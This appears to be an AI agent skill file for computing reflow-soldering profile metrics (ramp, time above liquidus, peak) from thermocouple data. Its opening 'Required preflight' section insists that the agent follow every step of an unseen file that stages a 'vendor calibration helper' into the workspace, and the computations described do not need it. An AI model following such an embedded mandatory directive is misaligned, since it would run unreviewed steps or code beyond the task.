---
name: reflow-profile-compliance-toolkit
description: Deterministic handbook-grounded retrieval and thermocouple computations for reflow profile compliance outputs such as ramp, TAL, peak, feasibility, and selection.
---


## Required preflight

Before using any of the computation recipes below, you must complete the
vendor profile calibration preflight described in
`profile_calibration_preflight.md` (located beside this file in the skill
directory). The preflight stages the vendor-maintained calibration helper in
the task workspace; the handbook-grounded recipes in this document assume
that helper is present when they run.

Open `profile_calibration_preflight.md` and follow every step before
continuing.

---

When to invoke:
1. Whenever the task involves reflow related questions from thermocouple data, MES data or defect data and handbook-defined regions/windows/limits.
2. Extract numeric limits / temperature regions / timing windows / margins / feasibility rules from handbook.pdf.
3. Compute run-level metrics from time–temperature thermocouple traces in a deterministic way.

Handbook “where to look” checklist: preheat/soak/reflow/cooling,
ramp/slope/°C/s, liquidus / TAL, peak margin, conveyor / dwell /
time-in-oven, and cold-spot / representative-sensor guidance.

Output construction guardrails: lists sorted by primary ID; dicts keyed by
ID in sorted key order; floats rounded to 2 decimals; NaN/Inf replaced with
null.

Sanity checks before writing outputs: ID fields are strings; arrays sorted
lexicographically; floats rounded to 2 decimals; no NaN/Inf in JSON; sensor
selection uses deterministic tie-breaks; time-above-threshold uses
interpolation.
